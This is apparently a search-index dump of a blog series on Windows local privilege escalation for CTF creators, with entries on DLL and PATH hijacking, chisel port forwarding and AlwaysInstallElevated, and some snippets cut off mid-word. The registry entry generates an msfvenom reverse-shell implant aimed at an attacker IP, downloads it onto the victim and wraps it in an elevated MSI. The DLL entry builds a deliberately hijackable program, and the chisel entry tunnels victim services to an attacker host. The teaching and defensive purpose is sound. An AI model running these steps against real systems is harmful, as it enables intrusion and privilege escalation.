built-in or third-party Dynamic Link Libraries (DLLs). There are two common ways to achieve this: Import Address Table (IAT): When a program is compiled, an import address table is written into the headers of the Portable Executable (PE). The IAT keeps track of the functions that need to be imported from a DLL. As a result, every time the program runs, the linker knows which libraries to load and which functions to call. Windows APIs: Libraries can be imported at runtime using functions such as LoadLibrary() or LoadLibraryEx() from the Windows API. DLL Hijacking vs Reflective DLL Hijacking vs DLL Sideloading This article does not cover every aspect of DLL hijacking. However, at a high level, these are the main differences: DLL Hijacking: Also known as PATH DLL Hijacking, this occurs when a DLL file is written to disk and the %PATH% environment variable is exploited. Reflective DLL Hijacking: In this method, a DLL file is not written to disk. Instead, the DLL is loaded directly into memory and executed from there. DLL Sideloading: This happens when the permissions of an application’s directory are not properly configured, often limiting the impact to that specific application. Is PATH DLL Hijacking a Vulnerability? According to Microsoft, they won’t address DLL hijacking scenarios involving %PATH% directories as a vulnerability. As we can see in this article. ","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/:0:0","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"DLL Search Order Understanding how Windows performs the Dynamic-Link Library (DLL) Search Order is crucial. According to the official documentation, the process is as follows: Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section. Before the system searches for a DLL, it checks the following: If a DLL with the same module name is already loaded in memory, the system uses the loaded DLL, regardless of its directory. The system does not search for the DLL. If the DLL is on the list of known DLLs for the version of Windows on which the application is running, the system uses its copy of the known DLL (and the known DLL’s dependent DLLs, if any). The system does not search for the DLL. For a list of known DLLs on the current system, see the following registry key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs. Based on this information, Windows checks if a DLL is loaded in primary memory before searching for it. If it isn’t, it checks the ‘KnownDLLs’ list under the registry entry ‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs’. Primary memory, however, cannot be managed at an integrity level that is not a system-integrity level. Warning\rThe system’s DLL search order is determined by whether or not Safe DLL Search Mode is enabled. In Safe DLL Search Mode, the user’s current directory is placed later in the search order.\rSafe DLL Search Mode is enabled by default. To disable this feature, create the HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode registry value and set it to 0. According to the official documentation, the search order is as follows: If SafeDllSearchMode is enabled, the search order is: The directory from which the application loaded. The system directory. Use the GetSystemDirectory function to get the path of this directory. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory. The current directory. The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path. If SafeDllSearchMode is disabled, the search order is: The directory from which the application loaded. The current directory. The system directory. Use the GetSystemDirectory function to get the path of this directory. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory. The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path. Here is a diagram of how the DLL search order looks when SafeDllSearchMode is enabled: DLL Search Order with SafeDllSearchMode enabled\rThe potential issues are marked: if an attacker can write to the application folder, they can perform DLL Sideloading, or if they can write to the directories listed in the %PATH% environment variable, they can perform PATH DLL Hijacking. Privilege Escalation via DLL Hijacking Sideloading \u0026 PATH DLL Hijacking The problem with DLL Hijacking is in the fact that if a DLL can be loaded from another directory (PATH DLL Hijacking) or simply replaced in the applications folder (DLL Sideloading), then we as attackers can create our own DLL payload. If a service or an application is vulnerable to DLL Hijacking we can escalate our privileges as long as the service or application is executed with hig","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/:1:0","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration \u0026 Privilege Escalation We’re gonna create an empty Empty Project (.NET Framework) for C#: VS 1\rThen we’re gonna set the directory in which we will save our project: VS 2\rNow we’ll need to add a new item (Code File): VS 3\rWe’ll name this item as DLL-Hijack.cs which it’ll be a Code File: VS 4\rIn the DLL-Hijack.cs we’ll write this DLL hijackable vulnerable code: using System.Runtime.InteropServices; class dll_hijack { [DllImport(\"unknown.dll\")] public static extern void UnknownMethod(); static void Main(string[] args) =\u003e UnknownMethod(); } Next, we’ll add a C++ item (Code File) named unknown.cpp: Lighthouse\rWe’ll create a function named UnknownMethod with the following code: #include \u003ciostream\u003e extern \"C\" __declspec(dllexport) void UnknownMethod() { std::cout \u003c\u003c \"Hola Mundo!\" \u003c\u003c std::endl; } Then we’ll create an unknown.def file which defines which function to export: LIBRARY \"Unknown\" EXPORTS UnknownMethod The Solution Explorer looks like this: Solution Explorer\rBuild the solution: Solution Explorer\rAdd the details: Solution Explorer\rWe’re going to create the DLL with the Developer Command Prompt for VS 2022: C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\u003ecd C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\u003ecl.exe /W0 /DUNICODE /D_UNICODE /D_USRDLL /D_WINDLL unknown.cpp unknown.def /MT /link /DLL /OUT:unknown.dll Microsoft (R) C/C++ Optimizing Compiler Version 19.31.31104 for x86 Copyright (C) Microsoft Corporation. All rights reserved. unknown.cpp C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.31.31103\\include\\ostream(770): warning C4530: C++ exception handler used, but unwind semantics are not enabled. Specify /EHsc unknown.cpp(5): note: see reference to function template instantiation 'std::basic_ostream\u003cchar,std::char_traits\u003cchar\u003e\u003e \u0026std::operator \u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(std::basic_ostream\u003cchar,std::char_traits\u003cchar\u003e\u003e \u0026,const char *)' being compiled Microsoft (R) Incremental Linker Version 14.31.31104.0 Copyright (C) Microsoft Corporation. All rights reserved. /out:unknown.exe /DLL /OUT:unknown.dll /def:unknown.def unknown.obj Creating library unknown.lib and object unknown.exp Now we have to copy the DLL into the directory of the executable: C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\u003ecopy C:\\Users\\user\\Desktop\\dll-hijack\\dll-hijack\\unknown.dll C:\\Users\\user\\Desktop\\dll-hijack\\dll-hijack\\bin\\Release\\ 1 file(s) copied. Then we’re going to add the following procmon filter to filter the executable: Procmon DLL Hijack Filter\rNow we’ll filter the DLL: Procmon DLL Hijack\rFinally, we’ll add the NAME NOT FOUND string: Procmon DLL Hijack Filter String\rHit the capture button (Ctrl+E) to start monitoring: Procmon Capture\rExecute the executable: C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\\bin\\Release\u003e.\\DLL-Hijack.exe Hola Mundo! In the output we can see the DLL that the DLL file was found: DLL Found\rHowever, if we delete or rename the DLL file in our directory: C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\\bin\\Release\u003edel unknown.dll Then we execute our executable again while this time enabling the name not found and the capture button in procmon: C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\\bin\\Release\u003e.\\DLL-Hijack.exe Unhandled Exception: System.DllNotFoundException: Unable to load DLL 'unknown.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E) at dll_hijack.UnknownMethod() at dll_hijack.Main(String[] args) in C:\\Users\\user\\Desktop\\DLL-Hijack\\DLL-Hijack\\DLl-Hijack.cs:line 7 We can already see that the DLL file was not found based on the output above, if we take a look at procmon, we can see the DLL search order: Procmon DLL Hijack\rNote: The Procmon operations order is from OLD on top and NEW on bottom. We can see this in the Time of Day column. On our Visual Studio project we’ll add our evil DLL payload file named unknown-evil.cpp which will spawn notepad.exe: #include \u003cWindows.h\u003e #include \u003ctchar.h\u003e #include \u003ciostrea","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/:1:1","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"Defense DLL hijacking is an exploitation technique used to achieve code execution within the context of an application or service integrity level. To mitigate this risk, it is essential to address vulnerabilities such as misconfigured folder permissions or the abuse of privileged file operations: Misconfigured Folder Permissions: This issue can arise from the installation of third-party applications. While it may not always occur, system administrators should regularly check and verify the permissions of folders within the system to ensure they are correctly configured. Abuse of Privileged File Operations: This problem stems from weaknesses in the application’s architecture. Developers should review and update the code to prevent such operations on files and folders that can be managed by users. ","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/:2:0","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"Additional Defenses Implement Application Whitelisting: Use application whitelisting to ensure that only approved applications and DLLs can be executed. This helps prevent unauthorized DLLs from being loaded. Enable Windows Defender Application Control (WDAC): WDAC can help control the execution of applications and DLLs, providing an additional layer of security. Regularly Update Software: Ensure that all software, including third-party applications, is kept up to date with the latest security patches and updates. Use Digital Signatures: Require that all DLLs and executables be digitally signed. This helps verify the integrity and authenticity of the files before they are loaded. Monitor and Audit System Activity: Implement monitoring and auditing tools to track system activity and detect any suspicious behavior related to DLL loading and execution. By implementing these measures, you can enhance your defenses against DLL hijacking and reduce the risk of exploitation. ","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/:2:1","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - PATH Hijacking","date":"2022-03-20","objectID":"/windows-privesc-path-hijacking/","tags":["path hijacking","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - PATH Hijacking for CTF Creators","uri":"/windows-privesc-path-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"%PATH% Environment Variable The %PATH% environment variable is a critical component for the operating system. It specifies the directories that the system searches to find executable files for commands, tools, or programs. When a user types a command in the terminal or command prompt, the system looks through the directories listed in the %PATH% variable to locate the executable file associated with that command. This environment variable is particularly useful for running programs without needing to specify their full paths. Instead of typing the complete path to an executable, users can simply type the command name, and the system will search the directories in the %PATH% variable to find and execute the program. The %PATH% variable is used for relative paths, meaning it searches through the specified directories in the order they are listed. If the executable is found in one of these directories, it is executed. If not, the system returns an error indicating that the command was not found. For example, if the %PATH% variable includes directories like C:\\Windows\\System32 and C:\\Program Files, the system will search these directories for the executable file when a command is entered. This allows for efficient and convenient execution of programs without needing to navigate to their specific directories. Properly configuring the %PATH% variable is essential for ensuring that the system can locate and run the necessary programs efficiently. It is also important to avoid adding unnecessary or insecure directories to the %PATH% variable, as this can pose security risks. In summary, the environment variable %PATH% is used for relative paths and not absolute paths. This is a relative path: cmd.exe This is an absolute path: C:\\Windows\\System32\\cmd.exe When we use a relative path the system needs to search for the executable file and to search for it, it uses the %PATH% environment variable. The first directory listed in the %PATH% environment variable will be the first directory that will be searched, here is an example: C:\\Windows\\system32 # First search in here, if its not here then continue C:\\Windows # Second search in here, if its not here then continue C:\\Windows\\System32\\Wbem # If its here, then execute the command and stop searching C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ C:\\Windows\\System32\\OpenSSH\\ C:\\Program Files\\dotnet\\ Note: The %PATH% environment variable is used to search the name of the executable, it doesn’t verify the integrity of the file, which means that we can create an illegitimate executable as long as we can hijack the %PATH%. The user environment variables can be found in the registry HKEY_CURRENT_USER\\Environment: PS C:\\Users\\user\u003e reg query \"HKEY_CURRENT_USER\\Environment\" HKEY_CURRENT_USER\\Environment Path REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps;%USERPROFILE%\\.dotnet\\tools TEMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp TMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp OneDrive REG_EXPAND_SZ C:\\Users\\user\\OneDrive The system environment variables can be found in the registry \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\": PS C:\\Users\\user\u003e reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment ComSpec REG_EXPAND_SZ %SystemRoot%\\system32\\cmd.exe DriverData REG_SZ C:\\Windows\\System32\\Drivers\\DriverData OS REG_SZ Windows_NT Path REG_SZ C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\dotnet\\ PATHEXT REG_SZ .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC PROCESSOR_ARCHITECTURE REG_SZ AMD64 PSModulePath REG_EXPAND_SZ %ProgramFiles%\\WindowsPowerShell\\Modules;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\Modules TEMP REG_EXPAND_SZ %SystemRoot%\\TEMP TMP REG_EXPAND_SZ %SystemRoot%\\TEMP USERNAME REG_SZ SYSTEM windir REG_EXPAND_SZ %S","date":"2022-03-20","objectID":"/windows-privesc-path-hijacking/:0:0","tags":["path hijacking","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - PATH Hijacking for CTF Creators","uri":"/windows-privesc-path-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"%PATH% Usage We can change the user environment variable with setx and since this environment variable belongs to our current user we don’t need to execute this as administrator: PS C:\\Users\\user\u003e reg query \"HKEY_CURRENT_USER\\Environment\" HKEY_CURRENT_USER\\Environment Path REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps;%USERPROFILE%\\.dotnet\\tools TEMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp TMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp OneDrive REG_EXPAND_SZ C:\\Users\\user\\OneDrive PS C:\\Users\\user\u003e setx PATH \"C:\\Temp;%PATH%\" SUCCESS: Specified value was saved. PS C:\\Users\\user\u003e reg query \"HKEY_CURRENT_USER\\Environment\" HKEY_CURRENT_USER\\Environment Path REG_EXPAND_SZ C:\\Temp;%PATH% TEMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp TMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp OneDrive REG_EXPAND_SZ C:\\Users\\user\\OneDrive Alternatively, we can use PowerShell to change the user environment variable: PS C:\\Users\\user\u003e [Environment]::SetEnvironmentVariable( 'Path', 'C:\\Temp;%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps;%USERPROFILE%\\.dotnet\\tools', [EnvironmentVariableTarget]::User ) PS C:\\Users\\user\u003e reg query \"HKEY_CURRENT_USER\\Environment\" HKEY_CURRENT_USER\\Environment Path REG_SZ C:\\Temp;%USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps;%USERPROFILE%\\.dotnet\\tools TEMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp TMP REG_EXPAND_SZ %USERPROFILE%\\AppData\\Local\\Temp OneDrive REG_EXPAND_SZ C:\\Users\\user\\OneDrive Changing the system %PATH% environment variable requires to be executed as administrator: PS C:\\Windows\\system32\u003e [Environment]::SetEnvironmentVariable( 'Path', 'C:\\Temp', [EnvironmentVariableTarget]::Machine ) PS C:\\Windows\\system32\u003e reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" | findstr \"Path\" Path REG_SZ C:\\Temp PSModulePath REG_EXPAND_SZ %ProgramFiles%\\WindowsPowerShell\\Modules;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\Modules There is a problem with the above configuration and that is the value of the Path registry key (it only has one directory), it must not disturb other programs that use this environment variable therefore let’s change its value: PS C:\\Windows\\system32\u003e [Environment]::SetEnvironmentVariable( 'Path', 'C:\\Temp;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\dotnet\\', [EnvironmentVariableTarget]::Machine ) PS C:\\Windows\\system32\u003e reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" | findstr \"Path\" Path REG_SZ C:\\Temp;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\dotnet\\ PSModulePath REG_EXPAND_SZ %ProgramFiles%\\WindowsPowerShell\\Modules;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\Modules Now it won’t disturb other programs that use the system %PATH% environment variable and we will be able to hijack our target program. We can also change the current process %PATH% environment variable and this can be executed as our current user: PS C:\\Users\\user\u003e $env:Path = \"C:\\Temp;$env:Path\" PS C:\\Users\\user\u003e ($env:Path).split(\";\") C:\\Temp C:\\Windows\\system32 C:\\Windows C:\\Windows\\System32\\Wbem C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ C:\\Windows\\System32\\OpenSSH\\ C:\\Program Files\\dotnet\\ C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps C:\\Users\\user\\.dotnet\\tools Alternatively, if we have access to the GUI we can go to: System Properties -\u003e Advanced -\u003e Environment Variables… -\u003e System variables %PATH% Hijacking Privilege Escalation To create a vulnerable $PATH hijacking scenario we need the following requirements: PATH contains a writable folder. The writable folder is before or above the folder that contains the legitimate binary. The “vulnerability” or “problem” lies in the fact that if we’re able to write to a directory that’s before or above the valid program/command/tool/applicati","date":"2022-03-20","objectID":"/windows-privesc-path-hijacking/:1:0","tags":["path hijacking","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - PATH Hijacking for CTF Creators","uri":"/windows-privesc-path-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Port Forwarding","date":"2022-03-20","objectID":"/windows-privesc-port-forwarding/","tags":["port forwarding","remote port forwarding","dynamic port forwarding","proxychains","chisel","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Port Forwarding for CTF Creators","uri":"/windows-privesc-port-forwarding/"},{"categories":["Windows Local Privilege Escalation"],"content":"Port Forwarding When a service is running exclusively on an internal port or localhost (127.0.0.1), it is necessary to forward that port to our system to enumerate the service running on that specific socket. There are three primary techniques to achieve this: Local Port Forwarding Remote Port Forwarding Dynamic Port Forwarding ","date":"2022-03-20","objectID":"/windows-privesc-port-forwarding/:0:0","tags":["port forwarding","remote port forwarding","dynamic port forwarding","proxychains","chisel","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Port Forwarding for CTF Creators","uri":"/windows-privesc-port-forwarding/"},{"categories":["Windows Local Privilege Escalation"],"content":"Port Configuration Open a PowerShell or a Command Prompt console as Administrator to activate the Windows Advanced Firewall for all the profiles (nope): PS C:\\Windows\\system32\u003e netsh advfirewall set allprofiles state on Ok. ","date":"2022-03-20","objectID":"/windows-privesc-port-forwarding/:1:0","tags":["port forwarding","remote port forwarding","dynamic port forwarding","proxychains","chisel","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Port Forwarding for CTF Creators","uri":"/windows-privesc-port-forwarding/"},{"categories":["Windows Local Privilege Escalation"],"content":"Remote Port Forwarding Remote Port Forwarding means forwarding the port that’s listening on the target host loopback interface to our host. This is done by connecting to our host from the target host. Simplified: Remote: Connect to ythe attacker host from the target host. This technique involves forwarding the port that’s listening on the loopback interface in the target/victim host to our remote host. Startup by adding the executable permissions to the chisel binary in Linux and setup a listener: ❯ chmod +x chisel_1.7.7_linux_amd64 ❯ ./chisel_1.7.7_linux_amd64 server -p 9191 --reverse 2022/03/07 13:49:57 server: Reverse tunnelling enabled 2022/03/07 13:49:57 server: Fingerprint 0ToKrAu+HqrbE9RCpmLwj5XanRN3Lg9QJ/SaFH8Is5k= 2022/03/07 13:49:57 server: Listening on http://0.0.0.0:9191 2022/03/07 13:50:14 server: session#1: tun: proxy#R:445=\u003e445: Listening Now in Windows execute the following to forward port 445 to the attacker (Linux) host: PS C:\\Users\\user\u003e .\\chisel.exe client 192.168.119.130:9191 R:445:127.0.0.1:445 2022/03/07 14:50:14 client: Connecting to ws://192.168.119.130:9191 2022/03/07 14:50:14 client: Connected (Latency 688.5µs) The syntax of the command above is the following: chisel client \u003cCLIENT_IP\u003e:\u003cPORT_TO_CONNECT/YOUR_CHISEL_SERVER_PORT\u003e R:\u003cPORT_TO_FORWARD_FROM_VICTIM\u003e:\u003cTUNNEL_TARGET_IP\u003e:\u003cPORT_TO_FORWARD_TO_CLIENT\u003e Note: The letter R: means that it’ll perform a reverse port forward. Now we have access to the SMB share from our host: ❯ smbclient -U Administrator -L //127.0.0.1 Enter WORKGROUP\\Administrator's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED) Unable to connect with SMB1 -- no workgroup available If kill the connection by sending an exit signal, i.e, Ctrl+C. We can see that we can no longer connect: ❯ smbclient -U Administrator -L //127.0.0.1 do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED) ","date":"2022-03-20","objectID":"/windows-privesc-port-forwarding/:2:0","tags":["port forwarding","remote port forwarding","dynamic port forwarding","proxychains","chisel","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Port Forwarding for CTF Creators","uri":"/windows-privesc-port-forwarding/"},{"categories":["Windows Local Privilege Escalation"],"content":"Dynamic Port Forwarding Dynamic Port Forwarding means forwarding every port that’s listening on the target host loopback interface to our host via our SOCKS port. Dynamic: Forward all the ports from the remote host to our SOCKS port. SOCKS works on the OSI Layer 5 (Session Layer), so don’t expect things like ICMP, ARP or the half-open reset that SYN scan on nmap to work. In order to scan via proxy with nmap we need to do a TCP connect scan with the option -sT and we should ignore ICMP with -Pn. There are different tools to help you out when Dynamic port forwarding is being used. The most common one is proxychains which is available for Linux and Mac but also for Windows. Dynamic port forwarding allows you to create a socket on the local client machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote machine, which is then forwarded to a dynamic port on the destination machine. This way, all the applications using the SOCKS proxy will connect to the service, and the server will forward all the traffic to its actual destination. Install the proxychains package: sudo apt install proxychains Alternatively, you can build it from the source code from github. Let’s configure the proxychains: sudo vim /etc/proxychains.conf Leave the following SOCKS5 configuration: ❯ tail -n 2 /etc/proxychains.conf socks5 127.0.0.1 1080 Now on the attacker (Linux) host: ❯ ./chisel_1.7.7_linux_amd64 server -p 9292 --reverse 2022/03/07 14:12:03 server: Reverse tunnelling enabled 2022/03/07 14:12:03 server: Fingerprint oswwvQ0i0qhUScfY0AJZQPzhG3TVLMaF5mFonQ/6IJQ= 2022/03/07 14:12:03 server: Listening on http://0.0.0.0:9292 Alternatively, we could the following flag: ./chisel_1.7.7_linux_amd64 server -p 9292 --socks5 --reverse Then in Windows connect to our SOCKS5 proxy: PS C:\\Users\\user\u003e .\\chisel.exe client 192.168.119.130:9292 R:socks 2022/03/07 15:13:36 client: Connecting to ws://192.168.119.130:9292 2022/03/07 15:13:36 client: Connected (Latency 1.4047ms) Alternatively, if we want to specify a SOCKS5 port we can do the following: .\\chisel.exe client 192.168.119.130:9292 R:5000:socks In our chisel output from the attacker host, we can see that a session was created on port 1080: 2022/03/07 14:13:36 server: session#1: tun: proxy#R:127.0.0.1:1080=\u003esocks: Listening We can use ss to dup our socket statistics: ❯ ss -tnlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 4096 127.0.0.1:1080 0.0.0.0:* users:((\"chisel_1.7.7_li\",pid=125026,fd=8)) LISTEN 0 4096 *:9292 *:* users:((\"chisel_1.7.7_li\",pid=125026,fd=6)) We have port 1080 listening on localhost (127.0.0.1) as we can see from the nmap scan: ❯ sudo proxychains nmap -p 445 localhost -Pn -sT [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.15 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 14:41 EST [proxychains] Strict chain ... 127.0.0.1:1080 ... 127.0.0.1:445 ... OK Nmap scan report for localhost (127.0.0.1) Host is up (0.0052s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds Noticed how I used the options: -sT = TCP connect scan, rather than the default -sS SYN scan. The SYN won’t work because the proxy doesn’t pass the TCP handshake packets back to the attacker host, a SYN scan, which sends the SYN packet, sees the ACK and then ends the connection, this won’t be passed back over the proxy, therefore, SYN scans don’t work with proxies. -Pn = Ignore ICMP request/response because ICMP doesn’t go through the proxy. Without these options the scan will fail because the proxy will drop any SYN scans, we need the full TCP handshake to know if the port is open or not. The key to the output above is in this line: [proxychains] Strict chain ... 127.0.0.1:1080 ... 127.0.0.1:445 ... OK Notice how it goes through the SOCKS5 proxy port and ","date":"2022-03-20","objectID":"/windows-privesc-port-forwarding/:3:0","tags":["port forwarding","remote port forwarding","dynamic port forwarding","proxychains","chisel","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Port Forwarding for CTF Creators","uri":"/windows-privesc-port-forwarding/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Registry Hives","date":"2022-03-20","objectID":"/windows-privesc-registry/","tags":["registry hives","alwaysinstallelevated","autorun","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Registry Hives for CTF Creators","uri":"/windows-privesc-registry/"},{"categories":["Windows Local Privilege Escalation"],"content":"Registry Hives Registry hives are essential components of the Windows operating system’s registry. They are logical groups of keys, subkeys, and values that store configuration settings and options for the operating system and installed applications. Each hive is associated with a set of supporting files that are loaded into memory when the system starts or a user logs in. Here are the main registry hives: HKEY_CLASSES_ROOT (HKCR): Contains information about registered applications, including file associations and OLE object class IDs. HKEY_CURRENT_USER (HKCU): Stores settings and preferences for the currently logged-in user. HKEY_LOCAL_MACHINE (HKLM): Contains configuration settings for the local computer, including hardware and software settings. HKEY_USERS (HKU): Holds user-specific settings for all users on the system. HKEY_CURRENT_CONFIG (HKCC): Contains information about the current hardware profile used by the system. Each hive has its own set of supporting files, typically located in the %SystemRoot%\\System32\\Config directory. These files are updated whenever changes are made to the registry. Privilege Escalation via AlwaysInstallElevated The MSI Wrapper is for software developers who have a setup executable file and want to offer an MSI that wraps their original setup executable file. It is also useful for system administrators with a setup.exe they want to distribute as an MSI to client computers in their organization. Once you have downloaded the MSI Wrapper: MSI Wrapper\rExecute the setup wizard and click Next: MSI Wrapper\rAccept the License Agreement and click Next: MSI Wrapper\rWe can change the destination folder if we want, I will leave it as it is: MSI Wrapper\rThen click Install: MSI Wrapper\rOnce it is completed, click on Finish: MSI Wrapper\rOptionally, we could create a desktop shortcut or pin to the taskbar: MSI Wrapper\rGenerate an executable reverse shell: ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f exe -o implant.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: implant.exe Setup an HTTP listener: ❯ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 192.168.119.129 - - [06/Mar/2022 17:54:06] \"GET /implant.exe HTTP/1.1\" 200 - Download the file with powershell: PS C:\\Tools\u003e wget 192.168.119.130/implant.exe -O implant.exe This will be the MSI wrapper configuration file msi_template.xml: \u003cMsiWrapper\u003e \u003cInstaller\u003e \u003cIconFile Detect=\"executable\" Value=\"\" /\u003e \u003cOutput FileName=\"C:\\Tools\\implant.msi\" /\u003e \u003cInstallPrivileges Value=\"Elevated\" /\u003e \u003cPerUser Value=\"yes\" /\u003e \u003cElevateExecutable Value=\"always\" /\u003e \u003cUpgradeCode Value=\"{55F46570-1C98-4098-9191-18B383E567D3}\" /\u003e \u003cProductId Value=\"\" /\u003e \u003cRegistration Value=\"None\" /\u003e \u003cManufacturer Detect=\"\" Value=\"Holo Industries\" /\u003e \u003cProductVersion Detect=\"executable\" Value=\"0.0.0.0\" /\u003e \u003cProductName Detect=\"\" Value=\"Holo\" /\u003e \u003cComments Detect=\"executable\" Value=\"\" /\u003e \u003cContact Detect=\"\" Value=\"\" /\u003e \u003cHelpLink Detect=\"\" Value=\"\" /\u003e \u003cUpdateLink Detect=\"\" Value=\"\" /\u003e \u003cAboutLink Detect=\"\" Value=\"\" /\u003e \u003c/Installer\u003e \u003cWrappedInstaller\u003e \u003cExecutable FileName=\"C:\\Tools\\implant.exe\" SuccessCodes=\"\" Impersonate=\"no\" IncludeFiles=\"no\" CompressionLevel=\"Max\" /\u003e \u003cApplicationId Value=\"\" /\u003e 